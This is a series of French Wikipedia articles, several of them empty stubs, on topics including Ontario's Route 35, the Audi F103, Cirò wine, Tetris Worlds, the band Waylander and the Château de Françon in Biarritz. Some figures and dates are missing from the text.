Pour les liaisons radio descendantes des réseaux LTE, pour lesquelles il y a une moindre contrainte énergétique, c'est l'OFDMA qui est utilisé car il permet pour une même largeur spectrale, un débit binaire plus élevé.

</doc>
<doc id="6807033" url="https://fr.wikipedia.org/wiki?curid=6807033" title="Route 35 (Ontario)">
Route 35 (Ontario)

La route 35 est une route provinciale de l'Ontario reliant l'autoroute 401 à Newcastle à la route 60 à Dwight. Elle parcourt une longueur totale de .
Description du tracé.
La route 35 commence à Newcastle sur l'autoroute 401. Elle se dirige vers le nord et forme dès lors un multiplex avec la route 115 pendant en possédant les caractéristiques d'une autoroute à quatre voies séparées et ne possédant que quelques intersections à niveau. Après s'être détachée de la route 115, elle se dirige plein nord pendant jusqu'à une intersection avec la route 7 en croisant la route 7A à l'est de Bethany. Elle forme ensuite un multiplex avec la Route 7 pendant pour contourner la ville de Lindsay par le sud-ouest. 
La route 35 poursuit ensuite son trajet vers le nord jusqu'à Norland en passant dans la région de Kawartha Lakes. Au nord de Coboconk, la route 35 devient plus sinueuse, traversant une région beaucoup plus montagneuse. 
La route suit ensuite la rive est du Lac Gull en passant par Miners Bay. Après Minden, elle poursuit sa route vers le nord jusqu'à la route 118. Après avoir suivi les lacs Boshkung, Halls et Kabakwa, elle poursuit sa route vers le nord en étant encore plus sinueuse, vers Dorset jusqu'à la route 60, terminus de la route 35. 

</doc>
<doc id="6807034" url="https://fr.wikipedia.org/wiki?curid=6807034" title="Autoroute 104 (Nouvelle-Écosse)">
Autoroute 104 (Nouvelle-Écosse)



</doc>
<doc id="6807035" url="https://fr.wikipedia.org/wiki?curid=6807035" title="Ediradio">
Ediradio



</doc>
<doc id="6807036" url="https://fr.wikipedia.org/wiki?curid=6807036" title="Édiradio">
Édiradio



</doc>
<doc id="6807037" url="https://fr.wikipedia.org/wiki?curid=6807037" title="Audi 60">
Audi 60

L’Audi 60/75, également identifiée avec le code Audi F103, était une berline familiale construite par le constructeur allemand Auto Union. Apparue en 1965, cette voiture à traction, propulsée par des moteurs 4 cylindres à quatre temps, a été le premier modèle portant le nom d’"Audi" depuis la Seconde Guerre mondiale.
En 1969, l'entreprise Auto Union est officiellement renommée "Audi NSU Auto Union AG". Trois ans plus tard, la F103 a été remplacée par l'Audi 80.
Historique du mode.
Général.
La société Auto Union recréée en 1949 à Ingolstadt en Allemagne de l'Ouest, une filiale de Mercedes-Benz depuis 1958, avait été reprise par Volkswagen au tournant de 1964 / 1965. Audi a été absorbée par Auto Union pendant la crise économique mondiale, mais la marque n'avait plus été utilisée depuis la fin de la Seconde Guerre mondiale. En , la DKW F102 avait été mise sur le marché, un nouveau véhicule doté d'un moteur à deux temps. La DKW F 102 était la dernière voiture de tourisme avec un moteur à deux temps construite en Allemagne de l'Ouest. Son succès commercial a cependant été entravé par un certain nombre de problèmes techniques (grippage).
La F103 était un développement ultérieur de ce véhicule, c'est pour cette raison que l'on a opté pour l'équipement de la voiture avec un moteur à quatre temps. Pour limiter les coûts de développement, il est décidé de partir de la base de la F102 pour développer le nouveau modèle de la marque, la F103 qui a été présentée au public le à Feldafing. Dans ce contexte, l'Auto Union a abandonné le nom "DKW" pour les seuls véhicules produits encore pour le nom d'une autre marque traditionnelle du groupe, "Audi" ("Horch" en latin), connue pour ses innovations dans la période d'avant-guerre. Le nom de vente était initialement uniquement Auto Union «Audi», car il s'agissait initialement du seul véhicule de la nouvelle marque. D'autres modèles ont suivi. Avec ce modèle, Audi a été relancé, mais la marque DKW a disparu du marché automobile en 1966 avec la fin de la production de la DKW F 102.
La F102 était motorisée par un 3 cylindres 2 temps peu en phase avec la nouvelle image de modernité et la volonté de monter en gamme. Or, avant de revendre le groupe, Mercedes-Benz avait développé un 4 cylindres pour une future évolution de la F102 et c'est justement ce moteur moderne qui est utilisé dans la nouvelle Audi. La face avant était marquée par une calandre noire légèrement plus large et des phares rectangulaires, au lieu des phares ronds dans la calandre chromée de la F 102, elle a été totalement modifiée afin de changer la personnalité de la voiture et pour que le nouveau moteur se sente à l'aise. Comme le moteur quatre cylindres était plus long que le trois cylindres de DKW, l'avant de l'Audi a été allongé de 100 mm et le radiateur a été installé en biais sur le côté gauche à côté du moteur. Le principe de la traction avant de DKW a été conservé, de sorte qu'Audi était à l'époque le seul constructeur allemand de grandes voitures particulières avec des moteurs quatre temps et une traction avant - un concept qui, plus tard, prévaudra largement.
Carrosserie et équipement.
La F103 était disponible en version 2 et 4 portes berline, ainsi que 3 portes break (Ceci s'appelait "Variant" - comme les modèles break de Volkswagen), à l'exception du modèle Super 90. 
Initialement, la section arrière correspondait presque à celle de la F 102, mais elle avait des feux arrière qui englobaient les extrémités arrière des ailes.
L'Audi (72) et l'Audi 60 étaient proposées avec une version de base, la L, et une version haut de gamme. L'Audi Super 90 haut de gamme se distingue des autres modèles par l'ajout, de série, de baguettes à l'apparence chromées sur les passages de roues.
En , une évolution apparait, dotée d'un moteur plus puissant, l'Audi 80. Viendront ensuite plusieurs autres versions, la Super 90 (dotée d'un moteur 1.8L) en , ainsi que la 60 et la 75 en . En tant que modèle d'exportation, seuls quelques exemplaires de la Super 90 ont été vendus aux États-Unis, en tant que berline et break ("Station Wagon") à partir de 1969.
Lifting.
L'Audi F 103 n'a été que légèrement modifiée au cours de sa période de construction de sept ans. À l'été 1969, pour l'année modèle 1970, tous les modèles étaient équipés d'essuie-glaces placés les uns à côté des autres au lieu d'être superposés. À l'été 1970, le goulot de remplissage de carburant des berlines a été déplacé depuis l'arrière (sous le feu arrière droit) vers le panneau latéral arrière droit. Comme auparavant sur le Variant, il était maintenant recouvert d'un rabat. En supprimant le goulot de remplissage à l'arrière, il a été possible de modifier la forme des feux arrière, qui sont désormais plus hauts et plus étroits. De plus, tous les modèles ont reçu les poignées de porte de l'Audi 100. De face, les nouveaux modèles ne peuvent être reconnus que par le lettrage Audi modifié sur l'aile droite. À l'intérieur, il y avait des buses de ventilation latérales dans le tableau de bord, de nouvelles unités de commutation et un groupe d'instrumentations dans lequel les instruments étaient montés plus près les uns des autres, montés beaucoup plus haut, plus faciles à lire et plus modernes. Le nouveau tableau de bord avait toujours un film décoratif avec un motif en bois. Avant cela, le tableau de bord était en partie en tôle peinte.
Moteurs / technologie.
Les moteurs de la F103 étaient également appelés «moteurs Audi à moyenne pression». Ce terme a été choisi bien que le moteur ne développe pas une pression moyenne effective exceptionnelle dans aucune plage de vitesse. Le moteur 4 cylindres de 1.7L lancée en 1965 développe , cette puissance donne donc son nom à la première version. La caractéristique technique du moteur était le taux de compression, qui était très élevé pour l'époque. Un fonctionnement du moteur sans cliquetis était possible malgré la compression élevée, car des chambres de combustion Heron et des conduits d'admission enroulés en hélice - similaires aux moteurs avec le processus MAN M - ont été mis en œuvre, ce qui assurait une forte turbulence dans le mélange. De cette façon, les résidus de gaz (provoquant le cliquetis du moteur) étaient efficacement évacués, tout en augmentant la vitesse de combustion. Cependant, la conception de l'orifice d'admission signifiait que le remplissage était étranglé à des vitesses plus élevées. Cela a abouti à une performance maximale plutôt modérée. La version originale du moteur avait un taux de compression de 11,7:1. Le taux de compression a ensuite été réduit afin d'obtenir une meilleure douceur, le moteur est devenu un peu plus robuste. Il fallait de l'essence super à indice d'octane 98 (aujourd'hui appelé Super Plus). Les versions conçues pour l'essence ordinaire étaient compressées à 9:1, ce qui était également une valeur inhabituellement élevée.
À l'origine, le développement du moteur a commencé chez Mercedes avec le code interne "Mexico". L'objectif était un moteur polycarburant pour un usage militaire, mais il ne sera pas utilisé en tant que tel pour Ludwig Kraus, qui l'a ensuite adapté pour la F 102 après être devenu directeur technique chez Auto Union le 8 octobre 1963. Les moteur à quatre temps d'Audi avaient un arbre à cames inférieur (latéral) entraîné par une chaîne à rouleaux duplex et des soupapes en tête actionnées par des pare-chocs et des culbuteurs. Le moteur a constitué la base du moteur de l'Audi 100 C1 ultérieur. Le moteur à moyenne pression était également la base du moteur de 2 litres utilisé dans les Audi 100 C2, Volkswagen LT, Porsche 924 et AMC Gremlin. Cette version avait une culasse avec un arbre à cames en tête qui était entraîné par une courroie crantée. Les cylindres ont été coulés ensemble (il n'y avait pas de canaux d'eau de refroidissement entre eux) afin de permettre un alésage de 86,5 mm pour l'espacement des cylindres donné.
Dans la première génération de la plus grande Audi 100 (1968-1977), le même moteur avec une cylindrée accrue a été utilisé dans les versions jusqu'à 115 ch. Avec la première Audi 80, le moteur EA827 avec arbre à cames en tête nouvellement conçu (EA = "Entwicklungsauftrag" (ordre de développement en français)) a été introduit en 1972, il a ensuite été également utilisé dans presque tous les nouveaux modèles à traction avant de Volkswagen.
Comme sa prédécesseur, la DKW F 102, l'Audi F103 - avec les NSU Ro 80, VW K70 et certaines voitures Citroën de l'époque - avait des freins à disque "internes" entre la boîte de vitesses et l'arbre de transmission. Il y avait, de série, une boîte de vitesses à quatre vitesses avec levier de vitesses au volant, à partir de 1969, un levier de vitesses au sol pouvait également être commandé pour un coût supplémentaire. Une transmission automatique n'était pas offerte dans cette gamme.
Les roues avant avaient une suspension indépendante sur des doubles triangles, à l'arrière il y avait un essieu à manivelle de torsion rigide, guidé le long des leviers de suspension et d'une barre Panhard, il y avit une barre de torsion avec amortisseurs télescopiques à l'avant et à l'arrière.

</doc>
<doc id="6807044" url="https://fr.wikipedia.org/wiki?curid=6807044" title="Audi 60/75">
Audi 60/75



</doc>
<doc id="6807046" url="https://fr.wikipedia.org/wiki?curid=6807046" title="Dictionnaire bidialectal">
Dictionnaire bidialectal

Un dictionnaire bidialectal est un dictionnaire indiquant les équivalences de termes (mots et/ou expressions) entre deux variétés de langue ou dialectes différents.
Quelques exemples :
Exemples de dictionnaires bidialectaux.
- Звядадзе, Гиви, "Сопоставительный словарь современного американского и британского языка", Тбилиси, Тбилисский Государственный Университет, 1972 (nouvelle édition sous le titre : "Dictionary of Contemporary American English Contrasted with British English", Arnold-Heinemann, New Delhi, 1983, 400 p.).
- Meney, Lionel, ", Guérin, Montréal, 1999, 1884 p.
- " sous la direction de Claudio Chuchuy, Günther Haensch et Reinhold Werner, Gredos, Madrid, 2000, 729 p.
sous la direction de Gisela Cárdenas Molina, Antonio María Tristá Pérez et Reinhold Werner, Gredos, Madrid, 2000, 606 p.

</doc>
<doc id="6807047" url="https://fr.wikipedia.org/wiki?curid=6807047" title="Henri Buffet">
Henri Buffet

Henri Buffet, né le à Luzy (Nièvre) et mort le à Bandol (Var), est un homme politique français.

</doc>
<doc id="6807048" url="https://fr.wikipedia.org/wiki?curid=6807048" title="Autoroute 102 (Nouvelle-Écosse)">
Autoroute 102 (Nouvelle-Écosse)



</doc>
<doc id="6807049" url="https://fr.wikipedia.org/wiki?curid=6807049" title="Edmond Jollit">
Edmond Jollit

Edmond Jollit, né le à Melle et mort le à Azay-le-Rideau, est un homme politique français.
Biographie.
Edmond Jollit est le fils de Louis Jollit, receveur, et de Marie Eugénie Deschaume. Il suit ses études à l'École nationale vétérinaire de Lyon, devenant vétérinaire à Tours puis à Azay-le-Rideau.
Fondateur de diverses mutuelles de bétail, il devient président de la caisse régionale de Crédit agricole, de l'union départementale des organisations agricoles, du syndicat intercommunal d'électrification de la région d'Azay, du bureau de bienfaisance d'Azay, de la Société des vanniers de Villaines et de la Chambre d'agriculture d'Indre-et-Loire, ainsi que membre du conseil d'administration de la Fédération nationale du Crédit agricole et du conseil supérieur de la coopération.
Conseiller d'arrondissement de 1925 à 1934 et conseiller général de 1934 à 1961, maire d'Azay-le-Rideau de 1925 à 1961, il est sénateur de 1955 à 1959.

</doc>
<doc id="6807050" url="https://fr.wikipedia.org/wiki?curid=6807050" title="Joseph Leccia">
Joseph Leccia

Joseph Leccia, né le et mort le , est un homme politique français.
Biographie.
Né à Ajaccio, ce médecin s'installe à Tours près de son frère également médecin. Il est cousin de Marcel Leccia. Déporté résistant. Président du conseil de l'Ordre. Sénateur RPF . au Maire de Tours. Vice-Président du Conseil général d'Indre et Loire.

</doc>
<doc id="6807051" url="https://fr.wikipedia.org/wiki?curid=6807051" title="Paul Racault">
Paul Racault

Paul Racault, né le et mort le , est un homme politique français.

</doc>
<doc id="6807052" url="https://fr.wikipedia.org/wiki?curid=6807052" title="Raymond Villatte">
Raymond Villatte

Raymond Villatte, né le à Tours et mort le à Saint-Pierre-des-Corps, est un homme politique français.

</doc>
<doc id="6807063" url="https://fr.wikipedia.org/wiki?curid=6807063" title="Cirò (vignoble)">
Cirò (vignoble)

Cirò est un vignoble de la région de Calabre dans le sud de l'Italie.
Si à l’époque d’Hérodote, la Calabre était réputée pour ses vins et qu’on dénommait cette partie de la péninsule italienne "Enotria", dont la traduction généralement acceptée est « terre de vins » ou « terre de vignes », la Calabre ne jouit plus de cette reconnaissance et est aujourd’hui parmi les régions d’Italie produisant le moins de vin. À son sujet, le "Larousse des vins" indique par exemple : « Les classiques problèmes de l’Italie sont ici aggravés par la présence de populations, locales et touristiques, apparemment prêtes à boire n’importe quoi, ce qui n’encourage pas à l’effort. Seuls les vins DOC de Cirò (trois couleurs, le meilleur étant le rouge) ont une réputation tout juste méritée » . Ainsi, il semble que la Calabre n’est pas réputée pour ses vins mais qu’il existe apparemment une exception, soit la ville de Cirò, où est produit le vin Cirò DOC.
Production.
En 1997, la production totale de vins « Cirò DOC » a été de hl. Ceci représente plus de 40 millions de bouteilles. Pour saisir l’importance de cette production, il faut la replacer dans le contexte régional et national. Cette même année, la Calabre a produit hectolitres de vin, soit 1,49 % des 50 millions et demi d’hectolitres produits par l’ensemble de l’Italie. De ce total national, environ 10 millions et demi d’hectolitres étaient des vins DOC et DOCG, soit 20,84 %. En Calabre, la production de vin DOC s’élevait à hl, soit 4,78 % de son volume de production viticole, et 0,34 % seulement de l’ensemble la production vinicole DOC et DOCG nationale. Il est frappant de constater que sur ce total régional, 86,10 % des vins DOC produits par la Calabre provenaient de la zone « Cirò » DOC. En d’autres mots, cette zone est responsable de près de la totalité de la production DOC de la Calabre, et pratiquement la seule à être exportée hors des frontières régionales.
Place du Cirò dans les vins de Calabre.
Il existe 11 autres vins DOC en Calabre : Donnici, Savuto, Pollino, Melissa, Lamezia, Sant'Anna di Isola Capo Rizzuto, Greco di Bianco, Scavigna, San Vito di Luzzi, Verbicaro et Bivongi. Cependant, leur production est marginale en comparaison à celle du Cirò. De plus, aucune autre Denominazione di origine controllatta de Calabre ne détient une reconnaissance comme celle du Cirò. Seul le Greco di Binaco est un peu connu en dehors de sa zone de production. En effet, au-delà de son importance en termes de volume à l’échelle régionale, l’élément intéressant de la réalité vitivinicole de Cirò est que ce vin est l’unique vin de Calabre à avoir une certaine reconnaissance à l’échelle nationale et internationale, comme en fait foi le passage du Larousse des vins cité précédemment. Principalement exporté en Allemagne et en Suisse, le vin de Cirò se retrouve aussi en Angleterre, au Japon, aux États-Unis et au Canada.
Aire de production.
La Calabre se subdivise en cinq provinces administratives : Cosenza, Catanzaro, Reggio Calabria, Vibo Valentia et Crotone. C’est dans cette dernière province, dont la ville de Crotone constitue le chef-lieu, que se trouvent les communes de Cirò et de Cirò Marina. La province forme un triangle de s’étendant sur de large entre les versants occidentaux des massifs de la Sila et la mer Ionienne, et sur le long de la côte. La zone de production des vins « Cirò DOC » s’étend sur les quatre communes formant la limite nord de la province de Crotone, soit Cirò, Cirò Marina, Crucoli et Melissa. Néanmoins, la spécialisation viticole origine de Cirò, et le cœur de l’industrie vitivinicole actuelle se concentre à Cirò Marina où l’on retrouve la majorité des firmes vinicoles.
Le Cirò DOC.
Depuis le début des années 1960, la production vitivinicole italienne est régie par l’État par l’entremise de la loi sur les "denominazioni di origine". Quoique les producteurs reconnaissent qu’historiquement le vin de Cirò soit un vin rouge, la denominazione di origine controllata « Cirò » -constituée en 1969- permet et réglemente les conditions et exigences de production aussi bien en rouge qu’en rosé et en blanc. Les vins « Cirò » rouges et rosés doivent être produits à partir du Gaglioppo, cépage traditionnel spécifique à la zone. Peuvent également entrer dans la composition de ces vins les raisins des cépages trebbiano toscano et greco bianco, mais dans une proportion ne dépassant pas 5 %. Le Cirò bianco doit être obtenu par vinification des raisins de cépage Greco bianco, un autre cépage spécifique à la Calabre, auquel peuvent être assemblés les raisins du cépage Trebbiano toscano jusqu’à concurrence de 10 %.
Les raisins doivent obligatoirement être cultivés à l’intérieur des zones de production officiellement reconnues qui comprennent tout le territoire des deux communes de Cirò et Cirò Marina, soit respectivement 7015 et , s’étendent partiellement sur la commune de Melissa au sud jusqu’à la hauteur de Torre Melissa sur , et au nord sur la commune de Crucoli sur . Enfin, deux parcelles totalement détachées de la zone principale, d’une superficie de et de , se trouvent dans le territoire de la commune de Crucoli et complètent l’aire de culture totale légalement reconnue. En ce qui a trait à la viticulture, le règlement stipule que les conditions de culture doivent être celles traditionnelles à la zone. L’organisation des vignobles, la culture des vignes et les systèmes de taille doivent être ceux généralement utilisés ou, de quelque façon que ce soit, aptes à ne pas modifier les caractéristiques propres des raisins et des vins. Le rendement maximum de raisins permis pour la production des vins « Cirò » rouge et rosé ne doit pas excéder 115 quintaux par hectare de vignoble en culture spécialisée, et pour le « Cirò » blanc ce rendement ne doit pas être supérieur à 135 quintaux par hectare.
Les opérations de vinification, d’élevage et de conservation du vin « Cirò » rouge doivent obligatoirement être conduites à l’intérieur des territoires des quatre communes. Lors de la vinification, le pourcentage maximum de vin produit à partir d’une quantité donnée de raisins ne doit pas excéder les 70 % pour le « Cirò » rouge et rosé, et 72 % pour le « Cirò » blanc. Les raisins destinés à la vinification doivent atteindre un titre d’alcoométrie naturelle de 12 % par volume pour les vins « Cirò » rouges et rosés, et de 10,5 % pour le vin « Cirò » blanc. Ne sont admises que les pratiques œnologiques locales intègres et constantes, de manière à conférer au vin ses caractéristiques propres. Le « Cirò » rouge ne peut être mis en vente avant le premier juin de l’année suivant celle de sa vendange.
Appellations.
L’appellation supplémentaire de « classico » est réservée au vin « Cirò » rouge produit à partir de raisins provenant et vinifiés à l’intérieur des limites communales de Cirò et de Cirò Marina. Les vins « Cirò » rouge et « Cirò » rouge classico qui proviennent de raisins détenant un niveau d’alcoométrie minimum de 13 % par volume, et qui ont un titre d’alcoométrie minimum de 13,5 % une fois vinifiés peuvent porter la mention « superiore ». Enfin, les vins « Cirò » rouge superiore et « Cirò » rouge classico superirore qui ont été soumis à un vieillissement minimum de deux ans peuvent porter sur l’étiquette la qualification « riserva ». La période de vieillissement est alors mesurée à partir du premier janvier suivant l’année de production des raisins.
Caractéristiques organoleptiques.
Le vin de Cirò rouge est de couleur cerise orangé peu soutenu et limpide. Les arômes uniques et particuliers que lui confère le cépage gaglioppo sont floraux et très parfumés. En vieillissant, ce vin développe des arômes d'hydrocarbures très agréables. En bouche, le vin présente une belle acidité et un degré d'alcool élevé. Les tanins sont affirmés. Lorsqu'il est bien vinifié, il s'agit d'un très bon vin présentant des qualités spéciales qui sauront charmer l'amateur.
Bibliographie.
Fournier, Vincent, (2014). Le vin comme performance culturelle. Le cas du Cirò Doc en Calabre, Montréal: Del Busso Éditeur, 164 p.

</doc>
<doc id="6807067" url="https://fr.wikipedia.org/wiki?curid=6807067" title="Masque de fusion">
Masque de fusion



</doc>
<doc id="6807068" url="https://fr.wikipedia.org/wiki?curid=6807068" title="CSPÎ">
CSPÎ



</doc>
<doc id="6807069" url="https://fr.wikipedia.org/wiki?curid=6807069" title="Tetris Worlds">
Tetris Worlds

Tetris Worlds est l’une des versions du populaire jeu vidéo "Tetris". Cette version a été lancée en 2001 pour PC et Game Boy Advance, pour être ensuite adaptée au Xbox, GameCube et PlayStation 2 en 2002.
Les différentes adaptations du jeu ont été conçues par trois développeurs différents, selon la plate-forme pour laquelle a été adaptée le jeu. Ainsi, Blue Planet Software développa la version sur PC et PlayStation 2, Radical Entertainment se chargea de la version sur GameCube et Xbox, alors que la version pour Game Boy Advance fut développée par 3d6 Games. Toutes les versions furent éditées par THQ.
Système de jeu.
Le jeu consiste en une partie simple de Tetris comme les autres versions. Toutefois, le joueur a accès à 6 modes de jeu différents qui permettent de modifier l’expérience du jeu : le classique, le sticky, le fusion, le hotline, le cascade et le mode multijoueur.
Mode histoire.
Le joueur peut envoyer ses "Mino Tetrinaut" dans six mondes différents, où il/elle jouera ensuite la variante du jeu Tetris correspondant à ce monde. Quand le joueur effectue suffisamment de parties dans un monde donné, davantage de Minos sont sauvés. Plus le joueur est doué, et plus le nombre de Minos sauvés augmente. Le monde sera ensuite transformé en terre d’accueil pour les Minos.
Mode arcade.
Il s’agit d’un mode où le joueur effectue une partie de Tetris d’une durée de deux minutes, de n’importe quelle variante. C’est aussi dans ce mode que les parties à plusieurs joueurs sont possibles. Les variantes possibles listées dans le menu du Mode Arcade sont les suivantes :
Accueil.
Bien que "Tetris World" ait reçu quelques critiques positives, la majorité des critiques lui attribuent une note médiocre ou négative.
Dans la version pour PC, PS2 et GBA, le système de jeu diffère du jeu original dans la manière de placer les Tetrominos. Dans le jeu original, lorsqu’un Tetromino touche le bas de l’écran, il fige et il n’est alors plus possible d’en changer la position. Toutefois, les nouvelles versions permettent au joueur de modifier la position de la pièce (soit lui faire effectuer une rotation ou la bouger) une fois qu’elle a atteint le bas de l’écran et ce, jusqu’à ce qu’il décide de la figer en place. Les critiques s’opposent au "Easy spin" en arguant que cette façon de faire rend le jeu trop facile, et GameSpot a statué que ça «brisait Tetris». Toutefois, tel que mentionné ci haut, la version GBA possède un mode caché intitulé "Tetris populaire" qui permet d’accéder à une version originale de Tetris, sans l’option critiquée. Toutefois, puisqu’il s’agit d’une version cachée qui ne figure pas dans la présentation du jeu « par défaut », plusieurs critiques sont passés à côté de ce fait.
Dans la version pour GameCube et Xbox, l’option "Easy spin" peut être désamorcé. Les critiques demeurent néanmoins partagées pour ces versions également.
En fait, c’est la version de "Tetris Worlds" sur Xbox Live qui reçoit les meilleures critiques.

</doc>
<doc id="6807070" url="https://fr.wikipedia.org/wiki?curid=6807070" title="Température de demi-vie">
Température de demi-vie

La température de demi-vie (HLT, ), notée par exemple "T"½, d'une substance est la température à atteindre pour une demi-vie ("t"½) donnée. Plus cette température est élevée, plus la substance est stable. En chimie, cette grandeur est considérée pour comparer facilement la stabilité de molécules.
Application en chimie.
Ce paramètre est utilisé par exemple pour choisir l'amorceur d'une polymérisation (en synthèse organique) ou d'une réticulation (en chimie des polymères). Ces réactions peuvent être obtenues par génération "" de radicaux issus de la thermolyse d'un peroxyde.
La détermination de la température de demi-vie d'un peroxyde se fait en solution diluée ; les valeurs de "T"½ peuvent varier en fonction de la méthode selon laquelle elles sont mesurées, en particulier le solvant utilisé.
Exemples de valeurs, pour "t"½=, concernant trois peroxydes organiques :
Des valeurs de "T"½, pour "t"½ égal à et , sont aussi données dans les catalogues.

</doc>
<doc id="6807072" url="https://fr.wikipedia.org/wiki?curid=6807072" title="Waylander (groupe)">
Waylander (groupe)

Waylander est un groupe de folk metal britannique, originaire d'Armagh, en Irlande du Nord. Formé en 1993, le groupe mêle folk irlandais traditionnel et black metal.
Biographie.
Formé en 1993, Waylander publie sa première démo, ', au début de 1995, mêlant musique folk irlandaise et metal extrême. En 1996, après avoir recruté un joueur de ', Waylander publie sa deuxième démo, ', qui se popularise dans la scène folk metal. Le groupe signe par la suite au label Century Media Records, et en 1998 publient leur premier album, intitulé '. Plusieurs concerts suivent pour la promotion de l'album mais des problèmes de label et des problèmes internes freinent quelque peu l'activité du groupe. 
Après plusieurs changement de formation, Waylander signe avec le label Blackend Records, et publie l'album ' au début de 2001. De nouveaux problèmes internes surgissent et la formation change encor une fois. Malgré ça, Waylander parvient à jouer en festival comme notamment au Bloodstock et au Day of Darkness, et en concert avec Ancient Rites, Cathedral, Sabbat et Skyforger. En 2005, les membres ArdChieftain O' Hagan, Michael Proctor, et Den Ferran sont rejoints par Saul McMichael et Gareth Murdock à la guitare. Waylander signe avec le label Listenable Records au début de 2008, et publie son troisième album '. Le premier album du groupe, "", est réédité par Midhir Records en CD et vinyle. En 2009, Gareth Murdock quitte le groupe et devient le nouveau bassiste d'Alestorm.
En , le groupe annonce son entrée en studio pour l'enregistrement de leur nouvel album, "Kindred Spirits". L'album est finalement publié en 2012. Le , le groupe participe au Cernunnos Pagan Fest VI, à Paris, en France.

</doc>
<doc id="6807076" url="https://fr.wikipedia.org/wiki?curid=6807076" title="Kimiyoshi Yasuda">
Kimiyoshi Yasuda

, né le et mort le , est un réalisateur japonais.
Biographie.
Kimiyoshi Yasuda dirige six des vingt-six films de la série Zatoichi interprétée par Shintarō Katsu.
Il a réalisé plus de 80 films entre 1944 et 1973.

</doc>
<doc id="6807079" url="https://fr.wikipedia.org/wiki?curid=6807079" title="Rudno (Serbie)">
Rudno (Serbie)



</doc>
<doc id="6807083" url="https://fr.wikipedia.org/wiki?curid=6807083" title="Joan Boscà">
Joan Boscà



</doc>
<doc id="6807085" url="https://fr.wikipedia.org/wiki?curid=6807085" title="Kizhi">
Kizhi



</doc>
<doc id="6807087" url="https://fr.wikipedia.org/wiki?curid=6807087" title="1957 au Brésil">
1957 au Brésil

Cette page concerne les événements survenus en 1957 au Brésil.

</doc>
<doc id="6807094" url="https://fr.wikipedia.org/wiki?curid=6807094" title="Minoru Shibuya">
Minoru Shibuya

, né le et mort le , est un réalisateur japonais.
Biographie.
Minoru Shibuya nait le à Asakusa (Tokyo), il fréquente le département de littérature anglaise de l'université Keiō mais le quitte avant d'être diplômé. Il rejoint la Shōchiku en 1930 et y travaille comme assistant réalisateur auprès de Yasujirō Ozu, Mikio Naruse, et Heinosuke Gosho, avant de faire ses débuts derrière la caméra en 1937 avec . Il tourne d’abord des mélodrames modernes à succès, genre qui est alors la marque de fabrique de la Shōchiku.
En 1943, Minoru Shibuya est appelé sous les drapeaux et est envoyé sur le front chinois, il ne revient au Japon qu'en , plusieurs mois après la fin de la guerre du Pacifique. Dans les années 1950, il s'affirme comme auteur avec des comédies satiriques sur les mœurs japonaises de l'après-guerre. En 1953, il est récompensé du prix Mainichi du meilleur réalisateur pour et , ce dernier film étant aussi est présenté en compétition au festival de Cannes 1953.
Avec , et , son style visuel soigné devient évident dans ses compositions utilisant le format CinemaScope. En 1965, il tourne , un film hommage à Yasujirō Ozu basé sur les notes de travail laissées par le grand cinéaste avant sa mort en . Mais comme le note le critique Chris Fujiwara, « les films de Shibuya sont à mille lieues de ceux d'Ozu : durs, parfois véhéments, imprégnés d'humour noir, qui tendent à déformer le corps humain ou à le pousser dans les tréfonds de compositions violemment modernistes ». Ce sera son dernier film pour la Shōchiku, où il aura effectué l'essentiel de sa carrière.
Minoru Shibuya dirige près d'une cinquantaine de films entre 1937 et 1966. Il « travaille avec la même facilité dans la comédie et le mélodrame, [et] laisse sa marque en tant que chroniqueur ironique mais compatissant des difficultés du début de la période d'après-guerre ».
Il meurt des suites d'une pneumonie le à l'âge de 73 ans.

</doc>
<doc id="6807112" url="https://fr.wikipedia.org/wiki?curid=6807112" title="Château de Françon">
Château de Françon

Le château de Françon (ou « domaine de Françon ») est un édifice dont la construction, dans le dernier quart du , fut confiée aux architectes Ralph Selden Wornum et Edward Salomo. Il est situé à Biarritz, dans le département français des Pyrénées-Atlantiques en région Nouvelle-Aquitaine.
Son propriétaire, Lord Pennington Mellor, était un armateur fortuné qui voulut partir d'Angleterre (son pays d'origine) pour s'installer en France; selon lui pour faciliter son commerce nautique.
Il a été situé par les architectes pour sa vue panoramique sur l'océan Atlantique et son air iodé avec vertus thérapeutiques.
Certaines pièces du château sont classées par les monuments historiques depuis 1999 alors que tous les éléments bâtis sont inscrits par arrêté du , modifié par arrêté du .
Le château de Françon a été vendu à la Caisse nationale des allocations familiales en 1948, et a été transformé en centre d'accueil en 1985. Il est désormais sous la gestion locative de VTF. La Caisse d'allocations familiales de la Gironde restant propriétaire.
Description.
Le château est du style anglo-normand. En vue externe, il possède des baies vitrées, deux tourelles et quelques vitraux. Quant à l'intérieur, il possède au rez-de-chaussée un hall en parquet avec une cheminée, une ancienne bibliothèque, un vestibule pour y ranger les affaires des gens y étant invités (à l'époque), une salle à manger ou salle de bal, un salon japonais, et une salle pour les hommes, appelée le fumoir.
Au premier étage se trouvent les chambres de John Pennington Mellor et de sa femme, un grand salon autour duquel s'organisent les pièces de leurs deux enfants, de chambres de bonnes, du cabinet de travail du lord, et d'une très luxueuse et colorée où sont peints de nombreux paons et même une allégorie de leur famille avec des paons.
Le château était entouré d'un vaste parc d'autrefois 50 hectares soit 50 000 mètres carrés où ont été importées de nombreuses essences végétales exotiques et dont certaines existent encore de nos jours. Ainsi, en plus de chênes, hêtres et frênes, on trouve des bambous, des palmiers, séquoias, mélèzes, ginkgos. Il ne reste aujourd'hui que 4 hectares.
Devant la porte à l'ouest du parc se trouve un petit chalet suisse, d'où son nom, tout en bois, que le lord a fait venir par bateau depuis une exposition universelle.
Enfin, au beau milieu du parc se trouve une ancienne piscine creusée, ce qui est très privilégié pour l'époque, en effet, le système comprenait même une pompe pour alimenter le bassin en eau.
Le hall.
Le hall est l'une des plus grandes pièces du château. Ce hall est recouvert de parquet. Les murs montrent les effigies de l'Angleterre et de la fleur de lis française sur fond pourpre. Ce hall mène au grand escalier avec un pylône en marbre et où une ancienne lampe était installée pour éclairer le soir.
Il y a une cheminée où de chaque côté de l'âtre sont peints sur des carreaux de faïence deux chasseurs avec des vêtements du Moyen Âge. Cette cheminée est aussi dominée par quatre bustes de Diane. Ces symboles relevaient la passion du propriétaire pour la chasse. Une anecdote indique que ce dernier, passionné par la chasse au renard, en aurait fait importer en quantités énormes depuis l'Angleterre jusque dans son parc.

</doc>
<doc id="6807114" url="https://fr.wikipedia.org/wiki?curid=6807114" title="Paul Van Damme">
Paul Van Damme



</doc>
<doc id="6807116" url="https://fr.wikipedia.org/wiki?curid=6807116" title="Steve Cuzor">
Steve Cuzor

Steve Cuzor, né le à Rennes, est un dessinateur et scénariste de bande dessinée français.
Biographie.
